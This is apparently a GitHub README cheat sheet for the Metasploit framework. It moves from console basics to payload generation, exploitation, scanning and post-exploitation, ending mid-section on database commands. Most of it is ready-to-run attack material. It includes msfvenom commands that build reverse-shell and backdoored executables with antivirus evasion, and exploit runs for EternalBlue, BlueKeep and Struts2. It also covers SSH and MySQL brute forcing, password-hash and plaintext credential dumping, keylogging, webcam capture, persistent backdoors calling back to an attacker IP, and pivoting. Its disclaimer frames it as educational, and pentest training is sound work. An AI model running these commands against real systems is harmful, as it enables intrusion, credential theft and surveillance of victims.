# Metasploit-dictionary
A metasploit dictionary from beginner level the advanced level including most of the important commands to help you as a personal sheet 

> **⚠️ Legal Disclaimer**  
> This guide is for **educational purposes only**. Metasploit is a powerful framework. Unauthorized use of these techniques against systems you do not own or have explicit permission to test is illegal. The author assumes no responsibility for misuse or damage caused by these commands. Know the laws where you live. Use responsibly.


> 📄 **Quick Reference:** [One-page cheat sheet](QUICKREF.md) for the most common Metasploit commands.


## 📖 Table of Contents

1. [Metasploit Fundamentals](#1-metasploit-fundamentals)

2. [Payloads](#2-payloads)

3. [Exploits](#3-exploits)

4. [Auxiliary Modules](#4-auxiliary-modules)

5. [Post-Exploitation (Meterpreter)](#5-post-exploitation-meterpreter)

6. [Database Commands](#6-database-commands)

7. [Encoders and Evasion](#7-encoders-and-evasion)

8. [Handlers and Listeners](#8-handlers-and-listeners)

9. [Resource Scripts](#9-resource-scripts)

10. [Advanced Techniques](#10-advanced-techniques)

11. [Troubleshooting](#11-troubleshooting)



# 1. Metasploit Fundamentals

### Starting and Exiting

| Task | Command |
|------|---------|
| Start Metasploit (console) | `msfconsole` |
| Start Metasploit with a database | `msfconsole -d` |
| Start without loading all modules (faster) | `msfconsole -q` |
| Exit Metasploit | `exit` |

### Core Navigation Commands

| Task | Command |
|------|---------|
| Show all modules (by category) | `show` |
| Show all exploits | `show exploits` |
| Show all payloads | `show payloads` |
| Show all auxiliary modules | `show auxiliary` |
| Show all post-exploitation modules | `show post` |
| Show all encoders | `show encoders` |
| Show all nops | `show nops` |

### Using Modules

| Task | Command |
|------|---------|
| Use a specific module | `use [module/path]` |
| Go back one level (out of current module) | `back` |
| Show information about current module | `info` |
| Show options for current module | `show options` |
| Check if target is vulnerable (without exploiting) | `check` |

### Setting Parameters

| Task | Command |
|------|---------|
| Set a parameter (e.g., RHOSTS, LHOST, LPORT) | `set [PARAMETER] [value]` |
| Set a parameter globally (for all modules) | `setg [PARAMETER] [value]` |
| Unset a specific parameter | `unset [PARAMETER]` |
| Unset all parameters | `unset all` |
| Show your current global variables | `show global` |

### Running Modules

| Task | Command |
|------|---------|
| Execute the current module | `run` |
| Execute the current module (same as run) | `exploit` |
| Execute in the background (as a job) | `run -j` |
| Execute without checking for conflicts | `run -d` |
| Execute with a specific payload | `run payload=[payload/path]` |

### Session Management

| Task | Command |
|------|---------|
| List all active sessions | `sessions` |
| Interact with a specific session | `sessions -i [id]` |
| Stop a specific session | `sessions -k [id]` |
| Stop all sessions | `sessions -K` |
| Run a command on all active sessions | `sessions -c [command]` |
| Background the current session | `background` |

### Job Management

| Task | Command |
|------|---------|
| List all active jobs (exploits running in background) | `jobs` |
| Stop a specific job | `jobs -k [id]` |
| Stop all jobs | `jobs -K` |

### Help and Documentation

| Task | Command |
|------|---------|
| Show general help | `help` |
| Show help for a specific command | `help [command]` |
| Open the Metasploit wiki (within msfconsole) | `help -h` |

### Workspace Management (with database)

| Task | Command |
|------|---------|
| List all workspaces | `workspace` |
| Create or switch to a workspace | `workspace [name]` |
| Delete a workspace | `workspace -d [name]` |
| Rename a workspace | `workspace -r [old] [new]` |

### Database Commands (Quick Look)

| Task | Command |
|------|---------|
| Import an Nmap scan | `db_import [file.xml]` |
| Show hosts discovered | `hosts` |
| Show services discovered | `services` |
| Show credentials found | `creds` |
| Show vulnerabilities found | `vulns` |
| Delete all hosts (clear workspace) | `hosts -d` |

> **Note:** A full database section comes later. This is just enough to get started.

---

## First Steps Workflow (Example)

|Task|Meaning|
|-----|--------|
|msfconsole -d |     start Metasploit with database support|
|workspace target1|        Create a new workspace|
|search eternalblue |      Search for an exploit|
|exploit/windows/smb/ms17_010_eternalblue|            # See what needs to be set|
|set RHOSTS 192.168.1.10 / set LHOST 192.168.1.5|   # Your IP set LPORT 4444|
|check |                  # See if it's vulnerable|
|run |                    # Run the exploit|
|sessions |              # See the session you got back|
|sessions -i 1   |        # Interact with it|
|background   |           # Send session to the background when done|



# 2. Payloads

### Understanding Payloads

A payload is the code that runs on the target system after a successful exploit. Metasploit has three main types:

| Type | Description | When to Use |
|------|-------------|-------------|
| **Staged** | Small stager downloads the rest of the payload | Limited space (buffer overflow, limited memory) |
| **Stageless** | Single, self-contained payload | More reliable, but larger |
| **Inline** | Single payload (same as stageless) | Simpler, no separate download stage |

### Common Payload Naming Convention

| Part | Example | Meaning |
|------|---------|---------|
| OS | `windows/`, `linux/`, `android/` | Target operating system |
| Architecture | `x64/`, `x86/`, `armle/` | CPU architecture |
| Type | `meterpreter/`, `shell/`, `vnc/` | Payload family |
| Protocol | `reverse_tcp`, `bind_tcp`, `reverse_http` | Connection method |

### The Most Useful Payloads

| Payload | Use Case | Notes |
|---------|----------|-------|
| `windows/x64/meterpreter/reverse_tcp` | Standard Windows reverse shell | Most common, stable |
| `windows/meterpreter/reverse_tcp` | Same for 32-bit Windows | Use when target is x86 |
| `linux/x64/meterpreter/reverse_tcp` | Standard Linux reverse shell | Most common for Linux |
| `windows/x64/shell/reverse_tcp` | Simple reverse shell (no Meterpreter) | Smaller, less features |
| `android/meterpreter/reverse_tcp` | Android remote access | Requires APK installation |
| `java/meterpreter/reverse_tcp` | Cross-platform (Java installed) | Works on Windows, Linux, Mac |
| `osx/x64/meterpreter/reverse_tcp` | macOS target | For Mac systems |

### Finding Payloads

| Task | Command |
|------|---------|
| Show all payloads | `show payloads` |
| Search for payloads by keyword | `search name:reverse_tcp` |
| Search for payloads by OS | `search platform:windows` |
| Search for payloads by architecture | `search arch:x64` |
| Filter payloads in current module | `show payloads` (while in an exploit) |

### Setting a Payload

| Task | Command |
|------|---------|
| Set payload for current module | `set payload [payload/path]` |
| Set payload globally | `setg payload [payload/path]` |
| Show payload options after setting | `show options` |

### Required Payload Options

| Parameter | Purpose | Example |
|-----------|---------|---------|
| `LHOST` | Your IP address (listener) | `set LHOST 192.168.1.5` |
| `LPORT` | Your port (listener) | `set LPORT 4444` |
| `RHOST` | Target IP (bind payloads) | `set RHOST 192.168.1.10` |
| `RPORT` | Target port (bind payloads) | `set RPORT 4444` |

### Reverse vs. Bind Payloads

| Method | Direction | Best For |
|--------|-----------|----------|
| **reverse_tcp** | Target connects OUT to you | Most common. Bypasses inbound firewalls |
| **reverse_http** | Target connects out via HTTP | Blends in with web traffic |
| **reverse_https** | Target connects out via HTTPS | Encrypted, harder to detect |
| **bind_tcp** | You connect IN to target | Target has no outbound internet |

### Meterpreter vs. Shell Payloads

| Feature | Meterpreter | Regular Shell |
|---------|-------------|---------------|
| Stealth | High (runs in memory) | Low (creates new process) |
| Commands | Extensive (upload, download, hashdump, etc.) | Basic OS commands |
| Evasion | Built-in | None |
| File Transfer | Built-in | Manual (often unreliable) |
| Best For | Persistent, stealthy access | Quick tasks, limited space |

### Meterpreter Core Commands (Preview)

| Task | Command |
|------|---------|
| List processes | `ps` |
| Move to another process | `migrate [PID]` |
| Get current user privileges | `getuid` |
| Attempt privilege escalation | `getsystem` |
| Kill a process | `kill [PID]` |

(Full Meterpreter section comes later)

### msfvenom: Standalone Payload Generator

You don't need msfconsole to create payloads. `msfvenom` is a separate tool that generates payloads directly.

| Task | Command |
|------|---------|
| List all available payloads | `msfvenom -l payloads` |
| List all encoders | `msfvenom -l encoders` |
| List all output formats | `msfvenom -l formats` |
| Generate a Windows reverse shell EXE | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o shell.exe` |
| Generate a Linux reverse shell | `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f elf -o shell.elf` |
| Generate a PowerShell script | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f psh-reflection -o payload.ps1` |
| Encoded payload (AV evasion) | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe` |
| Embed payload in legitimate EXE | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -x /path/putty.exe -f exe -o putty_backdoor.exe` |

### Multi-Handler: Listening for Payloads

After generating a payload, you need a listener in msfconsole:


msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444
run



# 3. Exploits

### What Is an Exploit?

An exploit is a module that delivers a payload to a vulnerable target. It takes advantage of a software or hardware weakness to run code on the target system.

---

### Finding Exploits

**Basic Search Commands**

- Show all exploits: `show exploits`
- Search by CVE number: `search cve:2021`
- Search by name: `search eternalblue`
- Search by platform: `search platform:windows`
- Search by type (remote/local): `search type:remote`
- Search by author: `search author:hdm`
- Search by CVE score: `search cve:2021 cvss:9`

**Search Examples**

| What You Want | Command |
|---------------|---------|
| Windows SMB exploits | `search type:exploit platform:windows name:smb` |
| Remote Linux kernel exploits | `search type:exploit platform:linux name:kernel` |
| EternalBlue | `search eternalblue` |
| Apache exploits | `search apache` |
| MySQL exploits | `search mysql` |

---

### Understanding Search Results

When you search, you'll see results like this example:

`msf6 > search eternalblue`

**Matching Modules**

| Number | Name   |  Rank    | Check|
|--- | ----    | ----    | -----|
|0  |exploit/windows/smb/ms17_010_eternalblue   | average | Yes|
|1  |auxiliary/admin/smb/ms17_010_eternalblue  |    normal  | No|
|2 | exploit/windows/smb/ms17_010_psexec  |         normal  | Yes|

**What each column means:**
- **#** = Index number (use `use 0` to select it)
- **Name** = Full module path
- **Rank** = Reliability (excellent, great, good, normal, average, low, manual)
- **Check** = Whether `check` command works on this module

### Exploit Ranks (From Best to Worst)

Rank Meaning
excellent Works every time, no crashes
great Works reliably, rare crashes
good Works most of the time
normal Works on standard targets
average Often works, sometimes crashes
low Rarely works, often crashes
manual Requires manual configuration

Always choose the highest rank available for your target using an exploit.

## Step-by-step workflow:
- Select an exploit
use exploit/windows/smb/ms17_010_eternalblue

- Show available options
show options

- Set required parameters
set RHOSTS 192.168.1.10
set RPORT 445

- Show available targets (different OS versions)
show targets

- Set specific target if needed
set target 0

- Show payloads that work with this exploit
show payloads

- Set your payload
set payload windows/x64/meterpreter/reverse_tcp

- Set payload options
set LHOST 192.168.1.5
set LPORT 4444

- Test if target is vulnerable (if Check says Yes)
check

- Run the exploit
run

## Useful module commands:

 |Command |Purpose|
|----|----|
 |back| Exit current module without running it|
|info| Show detailed information about the module|
  |show options| Show required and optional parameters|
|show advanced| Show advanced options (timeouts, etc.)|
|show missing| Show only options that are not set|

## Setting Parameters:

|Command |Purpose |Example|
|---|---|-----|
|set [PARAM] [value] |Set a parameter for current module| set RHOSTS 192.168.1.10|
| setg [PARAM] [value] |Set globally (persists across modules)| setg LHOST 192.168.1.5|
|unset [PARAM] |Remove a parameter setting |unset RHOSTS|
|unset all| Remove all parameter |settings unset all|
|Show global| Show all global variables |show global|

Why use global variables? If you're testing multiple exploits on the same target, setg RHOSTS keeps your target IP across all modules. You set it once and forget it.

## Common Exploit Parameters:

|Parameter| Purpose |Typical Value|
|----|----|----|
|RHOSTS| Target IP address or range| 192.168.1.10|
|RPORT |Target port| 445, 80, 443|
|LHOST |Your IP (reverse shell listener)| 192.168.1.5|
|LPORT |Your port (reverse shell listener) |4444|
|SSL |Use SSL/TLS| true or false|
|VERBOSE| Show detailed output| true or false|

## Remote vs. Local Exploits:

|Type |Description| When to Use| Example|
|----|----|----|----|
|Remote exploit| Sent over network to a service |Target has a vulnerable network service| EternalBlue (SMB)|
|Local exploit| Run after you already have a shell |You have low privilege shell, need admin| Windows local privilege escalation|

### Local exploit example:

- After getting a basic shell:
``` bash
use exploit/windows/local/ms16_032_secondary_logon_handle
set SESSION 1
run
```

## Running the Exploit:

|Command| Purpose|
|---|---|
|run| Execute the exploit once|
|exploit| Same as run|
|run -j| Run as background job (keeps console free)|
|run -v| Verbose output (shows everything)|
|run -d |Run without checking for conflicts|

## Job Management (Background Exploits)

- When you use run -j, the exploit runs in the background.

|Command| Purpose|
|---|---|
|jobs| List all running jobs|
|jobs -k [ID] |Kill a specific job|
|jobs -K |Kill all running jobs|

## Check vs. Run

|Command |Purpose| Risk|
|---|---|---|
|check| Tests if target is vulnerable without exploiting| Low risk, no crash|
|run| Actually exploits the target| May crash target|

- Always run check first if the module supports it (Check column says "Yes").

## After Successful Exploitation

-  When an exploit succeeds, you'll see something like:

```bash
[*] Started reverse TCP handler on 192.168.1.5:4444
[*] Sending stage (200774 bytes) to 192.168.1.10
[*] Meterpreter session 1 opened (192.168.1.5:4444 -> 192.168.1.10:49178)
```
### Session management commands:

|Command |Purpose|
|---|----|
|sessions| List all active sessions|
|sessions -i [ID] |Interact with a specific session|
|sessions -k [ID] |Kill a specific session|
|sessions -K| Kill all sessions|
|sessions -c [cmd]| Run command on all sessions|
|background| Send current session to background|


## If the Exploit Fails: Troubleshooting

|Symptom| Likely Cause |Solution|
|----|----|----|
|Exploit completed, but no session| Payload didn't connect| Check LHOST, LPORT, firewall rules|
|"Connection refused" |Port is closed or filtered| Try different RPORT|
|"Target is not vulnerable" |Patch has been applied| Find a different exploit|
|"Exploit crashed the target" |Target unstable| Choose a different exploit or target type|
|"Timeout"| Network issues or slow target| Increase timeout: set WfsDelay 10|
|"Failed to load module"| Module path wrong| Double-check the path with search|


## Real-World Exploit Example 1: EternalBlue (MS17-010)

- This exploit targets Windows SMB vulnerability from 2017. Still works on unpatched systems.

```bash
msfconsole -q
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
set LHOST 192.168.1.5
set LPORT 4444
set payload windows/x64/meterpreter/reverse_tcp
check
run
sessions -i 1
```


## Real-World Exploit Example 2: BlueKeep (RDP)

- This exploits a vulnerability in Remote Desktop Protocol (CVE-2019-0708).

```bash
use exploit/windows/rdp/cve_2019_0708_bluekeep
set RHOSTS 192.168.1.10
set LHOST 192.168.1.5
set LPORT 4444
show targets
set target 7
run
```
- Important: BlueKeep requires the correct target number. Use show targets and match the target to the victim's operating system. Wrong target will crash the target.


  ## Real-World Exploit Example 3: Apache Struts2

- This exploits a remote code execution vulnerability in Apache Struts2 web applications.

```bash
use exploit/multi/http/struts2_rest_xstream
set RHOSTS 192.168.1.10
set RPORT 8080
set TARGETURI /orders
set LHOST 192.168.1.5
set LPORT 4444
run
```


## Summary: The Exploit Workflow

|Step |Code|
|----|----|
|1. Search for exploit  |  → search [keyword]|
|2. Select exploit   |     → use [module/path]|
|3. Show options     |     → show options|
|4. Set parameters    |    → set RHOSTS, set LHOST, etc.|
|5. Show targets     |     → show targets (if needed)|
|6. Show payloads    |     → show payloads|
|7. Set payload       |    → set payload [path]|
|8. Test vulnerability |   → check|
|9. Run exploit     |      → run|
|10. Interact with session| → sessions -i [ID]|



# 4. Auxiliary Modules

### What Are Auxiliary Modules?

Auxiliary modules are **not exploits**. They don't deliver payloads. Instead, they perform supporting tasks:
- Scanning networks
- Enumerating services
- Fuzzing for vulnerabilities
- Brute-forcing credentials
- Crawling websites
- Gathering information

Think of them as your **reconnaissance and support tools** inside Metasploit.

---

### Finding Auxiliary Modules

| Command | Purpose |
|---------|---------|
| `show auxiliary` | Show all auxiliary modules |
| `search type:auxiliary` | Search for auxiliary modules |
| `search name:scanner` | Find scanner modules |
| `search name:brute` | Find brute-force modules |
| `search name:enum` | Find enumeration modules |

**Search examples:**
- `search type:auxiliary name:smb` → Find SMB auxiliary modules
- `search type:auxiliary name:mysql` → Find MySQL auxiliary modules
- `search type:auxiliary name:portscan` → Find port scanners

---

### Types of Auxiliary Modules

| Category | Purpose | Example Module |
|----------|---------|----------------|
| **scanner** | Network and service scanning | `scanner/portscan/tcp` |
| **admin** | Administer services (brute force, etc.) | `admin/smb/ms17_010_eternalblue` |
| **fuzzer** | Send malformed data to find bugs | `fuzzer/http/http_form` |
| **gather** | Collect information (emails, files, etc.) | `gather/email_harvester` |
| **sniffer** | Capture network traffic | `sniffer/psnuffle` |
| **dos** | Denial of service (use carefully) | `dos/http/slowloris` |

---

### Using an Auxiliary Module

- The workflow is similar to exploits, but without payloads.


- Select an auxiliary module
use auxiliary/scanner/portscan/tcp

- Show required options
show options

- Set parameters
set RHOSTS 192.168.1.0/24
set RPORT 1-1000
set THREADS 10

- Run the module (no payload, no session)
run


## The scanner module pattern 

- Most scanner modules have common options:

|Parameter| Purpose |Example|
|----|----|----|
|RHOSTS| Target IP or range |192.168.1.0/24, 192.168.1.10|
|RPORT |Target port| 80, 445, 3306|
|THREADS| Number of parallel threads| 10 (higher = faster, noisier)|
|VERBOSE |Show detailed output| true or false|


## Useful Auxiliary Modules

- Port Scanners

|Module| Purpose|
|----|----|
|auxiliary/scanner/portscan/tcp| TCP port scanner|
|auxiliary/scanner/portscan/syn| SYN port scanner (faster)|
|auxiliary/scanner/portscan/xmas |XMAS port scanner (stealth)|
|auxiliary/scanner/portscan/ack| ACK port scanner (firewall mapping)|

- Example: TCP port scan

```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.10
set PORTS 1-1000
set THREADS 10
run
```


## SMB (Windows) Enumeration

|Module |Purpose|
|----|----|
|auxiliary/scanner/smb/smb_version |Detect SMB version|
|auxiliary/scanner/smb/smb_enumusers |Enumerate users|
|auxiliary/scanner/smb/smb_enumshares |Enumerate shared folders|
|auxiliary/scanner/smb/smb_login| Brute-force SMB passwords|
|auxiliary/scanner/smb/smb_ms17_010 |Check for EternalBlue vulnerability|

### Example: Enumerate SMB users

```bash
use auxiliary/scanner/smb/smb_enumusers
set RHOSTS 192.168.1.10
run
```

### Example: Check for EternalBlue

```bash
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.0/24
set THREADS 10
run
```


## HTTP (Web) Enumeration

|Module |Purpose|
|----|----|
|auxiliary/scanner/http/http_version| Detect web server version|
|auxiliary/scanner/http/dir_scanner| Directory brute-forcing|
|auxiliary/scanner/http/files_dir File| enumeration|
|auxiliary/scanner/http/robots_txt |Check for robots.txt|
|auxiliary/scanner/http/http_login |Brute-force web logins|

### Example: Directory scanner

```bash
use auxiliary/scanner/http/dir_scanner
set RHOSTS 192.168.1.10
set RPORT 80
set THREADS 10
run
```


## Database Enumeration

|Module |Purpose|
|----|----|
|auxiliary/scanner/mysql/mysql_version |Detect MySQL version|
|auxiliary/scanner/mysql/mysql_login |Brute-force MySQL|
|auxiliary/scanner/mysql/mysql_enum |Enumerate MySQL databases|
|auxiliary/scanner/postgres/postgres_version |Detect PostgreSQL version|
|auxiliary/scanner/postgres/postgres_login| Brute-force PostgreSQL|

### Example: MySQL login bruteforce

```bash
use auxiliary/scanner/mysql/mysql_login
set RHOSTS 192.168.1.10
set USERNAME root
set PASS_FILE /usr/share/wordlists/fasttrack.txt
run
```


## SSH Enumeration

|Module| Purpose|
|----|----|
|auxiliary/scanner/ssh/ssh_version| Detect SSH version|
|auxiliary/scanner/ssh/ssh_login |Brute-force SSH passwords|
|auxiliary/scanner/ssh/ssh_enumusers |Enumerate valid SSH usernames|

### Example: SSH brute force

```bash
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.10
set USER_FILE /usr/share/wordlists/users.txt
set PASS_FILE /usr/share/wordlists/passwords.txt
run
```


## FTP Enumeration

|Module| Purpose|
|----|----|
|auxiliary/scanner/ftp/ftp_version| Detect FTP version|
|auxiliary/scanner/ftp/anonymous |Check for anonymous login|
|auxiliary/scanner/ftp/ftp_login |Brute-force FTP|

### Example: Check anonymous FTP

```bash
use auxiliary/scanner/ftp/anonymous
set RHOSTS 192.168.1.10
run
```


## SNMP Enumeration

|Module| Purpose|
|----|----|
|auxiliary/scanner/snmp/snmp_enum |Enumerate SNMP information|
|auxiliary/scanner/snmp/snmp_login |Brute-force SNMP community strings|

### Example: SNMP enumeration

```bash
use auxiliary/scanner/snmp/snmp_enum
set RHOSTS 192.168.1.10
set COMMUNITY public
run
```


## Reconnaissance and Discovery

|Module| Purpose|
|----|----|
|auxiliary/scanner/discovery/arp_sweep |ARP sweep for local network|
|auxiliary/scanner/discovery/udp_sweep |UDP sweep|
|auxiliary/scanner/dns/dns_zone_transfer |Attempt DNS zone transfer|

### Example: ARP sweep (local network, needs root)

```bash
use auxiliary/scanner/discovery/arp_sweep
set RHOSTS 192.168.1.0/24
set THREADS 10
run
```


## Web Application Fuzzing

|Module| Purpose|
|----|----|
|auxiliary/fuzzer/http/http_form |Fuzz HTTP form fields|
|auxiliary/fuzzer/http/http_get| Fuzz HTTP GET parameters|
|auxiliary/fuzzer/http/http_post |Fuzz HTTP POST parameters|


## Denial of Service

|Module| Purpose|
|----|----|
|auxiliary/dos/http/slowloris |Slowloris DoS attack|
|auxiliary/dos/tcp/syn_flood| SYN flood attack|

- Warning: DoS modules can crash targets. Only use on systems you own or have written permission to test.


 ## Real-World Auxiliary Workflow Example

- **Scenario: You've joined a new network (192.168.1.0/24). You want to discover hosts, find open ports, and identify services:**


msfconsole -q

- Step 1: ARP sweep to find live hosts
use auxiliary/scanner/discovery/arp_sweep
set RHOSTS 192.168.1.0/24
set THREADS 10
run

- Step 2: TCP port scan on found hosts
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 1-1000
set THREADS 10
run

- Step 3: Identify SMB versions on hosts with port 445 open
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run

- Step 4: Check for EternalBlue vulnerability
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.0/24
run

- Step 5: Enumerate web servers on hosts with port 80 open
use auxiliary/scanner/http/http_version
set RHOSTS 192.168.1.0/24
set RPORT 80
run


## Summary: Auxiliary Module Workflow

|Step|Code|
|----|----|
|1. Find auxiliary module  |   → search type:auxiliary name:[keyword]|
|2. Select module       |      → use [module/path]|
|3. Show options       |       → show options|
|4. Set parameters       |     → set RHOSTS, set THREADS, etc.|
|5. Run the module       |     → run|
|6. Analyze output     |       → Look for interesting results|
|7. Move to next module   |    → Use findings to select next scan|




# 5. Post-Exploitation (Meterpreter)

### What Is Meterpreter?

Meterpreter is a **post-exploitation payload** that runs entirely in memory. It never touches the target's hard drive, making it stealthy and hard to detect. Once you have a Meterpreter session, you can:

- Control the target system remotely
- Upload and download files
- Steal passwords and hashes
- Take screenshots and record keystrokes
- Pivot to other systems on the network
- Escalate privileges

---

### Getting a Meterpreter Session

You typically get Meterpreter by setting it as your payload in an exploit or `multi/handler`.

```bash
use exploit/windows/smb/ms17_010_eternalblue
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444
run
```
- When the exploit succeeds, you'll see:

```text
[*] Meterpreter session 1 opened
msf6 exploit(ms17_010_eternalblue) > sessions -i 1
meterpreter >
```

## Core Meterpreter Commands

|Command |Purpose|
|----|----|
|help |Show all available commands|
|background| Send session to background|
|exit |Terminate the session|
|sessions| List all active sessions (from msfconsole)|
|sessions -i [ID] |Interact with a session (from msfconsole)|


## System Information

|Command |Purpose|
|----|----|
|sysinfo |Show target OS, computer name, architecture|
|getuid |Show current user privileges|
|getpid| Show current process ID|
|ps| List all running processes|

**Example:**

```bash
meterpreter > sysinfo
Computer        : DESKTOP-ABC123
OS              : Windows 10 (10.0 Build 19045)
Architecture    : x64
Meterpreter     : x64/windows
```


##  Process Management

|Command |Purpose|
|----|----|
|ps| List all running processes|
|migrate [PID] |Move Meterpreter to another process|
|kill [PID] |Terminate a process|
|execute -f [process] |Run a new process|

- Why migrate? Moving to a more trusted process (like explorer.exe or svchost.exe) can hide your session and bypass firewall rules.

- Example: Migrate to explorer.exe

```bash
meterpreter > ps | grep explorer
2528   explorer.exe
meterpreter > migrate 2528
[*] Migrating to 2528...
[*] Migration completed successfully
```


## File System Commands

|Command |Purpose Linux |Alternative|
|----|------|----|
|pwd |Show current directory| pwd|
|ls |List files |ls|
|cd [dir] |Change directory |cd|
|cat [file] |Display file contents| cat|
|upload [local] [remote]| Upload file to target| upload|
|download [remote] [local] |Download file from target |download|
|search -f [filename] |Search for files| search|
|rm [file] |Delete file| rm|
|mkdir [dir] |Create directory| mkdir|
|rmdir [dir] |Remove directory| rmdir|
|edit [file] |Edit file (Vim-like) |edit|

- Example: Search for sensitive files

```bash
meterpreter > search -f *.txt
Found 15 results...
```


## Networking Commands

|Command |Purpose|
|----|----|
|ipconfig / ifconfig |Show network interfaces|
|netstat |Show active connections|
|arp |Show ARP cache|
|route |Show routing table|
|getsystem |Attempt to elevate to SYSTEM|
|portfwd add -l [local] -p [remote] -r [ip]| Forward a local port to remote|

- Example: Port forwarding (pivoting)

```bash
meterpreter > portfwd add -l 8080 -p 80 -r 192.168.1.20
[*] Local TCP relay created: :8080 -> 192.168.1.20:80
```

- Now you can access http://localhost:8080 on your machine to reach 192.168.1.20:80 through the compromised host.


## Privilege Escalation

|Command |Purpose|
|----|----|
|getsystem| Attempt to elevate to SYSTEM (Windows)|
|getprivs |Show current privileges
run| |post/multi/recon/local_exploit_suggester| Find local exploits for privilege escalation|

- Example: Attempt privilege escalation

```bash
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation)
```

- Example: Run exploit suggester

```bash
meterpreter > background
msf6 > use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```


## Credential Theft

|Command |Purpose|
|----|----|
|hashdump Dump |Windows password hashes (SAM)|
|kiwi |(formerly mimikatz) Extract plaintext passwords and hashes|
|load kiwi| Load the Kiwi extension|
|creds_all |Dump all credentials (after loading kiwi)|

- Example: Dump hashes

```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

- Example: Extract plaintext passwords with Kiwi

```bash
meterpreter > load kiwi
meterpreter > creds_all
```


## Screen Capture and Keylogging

|Command |Purpose|
|----|----|
|screenshot |Take a screenshot of the target's desktop|
|webcam_list| List available webcams|
|webcam_snap |Take a picture from webcam|
|keyscan_start |Start keylogger|
|keyscan_dump |Dump captured keystrokes|
|keyscan_stop |Stop keylogger|

- Example: Keylogging

```bash
meterpreter > keyscan_start
[*] Starting keylogger...
meterpreter > keyscan_dump
Dumped keystrokes:
Password123<Return>
```


## Persistence

|Command| Purpose|
|----|----|
|run persistence -h |Show persistence options|
|run persistence -A -X -i 5 -p 4444 -r 192.168.1.5| Install persistent backdoor|

- Example: Install persistence (Windows)

```bash
meterpreter > run persistence -A -X -i 5 -p 4444 -r 192.168.1.5
[*] Installing persistent backdoor...
```

- The target will reconnect to your listener every 5 seconds, even after reboots.


  
## Pivoting (Lateral Movement)

- **Once you have one compromised host, you can use it to access other hosts on its network.**

- Step 1: Add a route through the compromised host

```bash
meterpreter > background
msf6 > route add 192.168.2.0 255.255.255.0 1
```

- Step 2: Scan the new network through the pivot

```bash
msf6 > use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.2.0/24
set PORTS 445
run
```


## Useful Meterpreter Extensions

|Extension |Command |Purpose|
|----|----|----|
|kiwi |load kiwi |Extract credentials (mimikatz)|
|priv| load priv |Privilege escalation helpers|
|incognito |load incognito |Token manipulation|
|sniffer| load sniffer| Network sniffing|
|stdapi| (loaded by default)| Core commands (filesystem, network)|


## Meterpreter Cheat Sheet (Most Useful Commands)

|Category| Command|
|----|----|
|System| sysinfo, getuid, ps, migrate|
|File |ls, cd, upload, download, search|
|Network| ipconfig, netstat, portfwd
Privilege getsystem, hashdump, load| kiwi|
|Stealth| keyscan_start, keyscan_dump, screenshot|
|Persistence| run persistence|
|Pivoting |background → route add → scan|


## Real-World Meterpreter Workflow


-- After gaining a session
sessions -i 1

- Check your privileges
getuid
sysinfo

- List processes and migrate to a trusted one
ps
migrate 2528   # explorer.exe PID

- Dump password hashes
hashdump

- Load Kiwi and get plaintext passwords
load kiwi
creds_all

- Start keylogger
keyscan_start

- Wait a few minutes...
keyscan_dump
keyscan_stop

- Take a screenshot
screenshot

- Background the session when done
background



# 6. Database Commands

### Why Use the Database?

- Metasploit's database stores scan results, hosts, services, credentials, and vulnerabilities. Instead of remembering IP addresses and open ports, you query the database.

**Benefits:**
- Store multiple scan results permanently
- Track hosts across different attacks
- Avoid scanning the same target twice
- Generate reports from stored data
- Share data between modules

---

### Starting the Database

- Metasploit uses PostgreSQL. Most penetration testing distributions (Kali, Parrot) have it pre-installed.

**Start PostgreSQL service:**
```bash
sudo systemctl start postgresql
```

- **Start Metasploit with database:**

```bash
msfconsole -d
```

- **Check database status from inside msfconsole:**

```bash
db_status
```

- Expected output:
```bash
  [*] Connected to msf. Connected to postgresql database
```


## Workspace Management

- Workspaces isolate different projects or targets.

|Command| Purpose|
|----|----|
|workspace| List all workspaces (current one marked with *)|
|workspace [name]| Create or switch to a workspace|
|workspace -a [name]| Add (create) a new workspace|
|workspace -d [name]| Delete a workspace|
|workspace -r [old] [new] |Rename a workspace|
|workspace -h| Show help|

### Example workflow:


- Create workspace for a specific target
```bash
workspace -a TargetCorp
```
- Verify you're in it
workspace
```bash
[*] default
[*] TargetCorp
```
- Do your scans...

- Switch back to default:
workspace default


## Importing Scan Results

- You can import results from other tools directly into the database.

|Command| Purpose|
|----|----|
|db_import [file] |Import scan results|
|db_import -h |Show supported file formats|

- **Supported formats:**

- Nmap XML (-oX)
- Nessus (NBE and XML)
- OpenVAS XML
- Nexpose XML
- Qualys XML
- Nikto CSV
- and many others

### Example: Import an Nmap scan


- From outside msfconsole
```bash
nmap -sV -oX scan.xml 192.168.1.0/24
```


- Inside msfconsole
```bash
db_import /path/to/scan.xml
```


## Hosts Management

|Command |Purpose|
|----|----|
|hosts |List all hosts|
|hosts -d [ip]| Delete a host|
|hosts -c [columns]| Show specific columns|
|hosts -R |Set RHOSTS to all discovered hosts|

- **Example: Show only IP and OS**

```bash
hosts -c address,os_name
```

- **Example: Set RHOSTS to all discovered hosts**

```bash
hosts -R
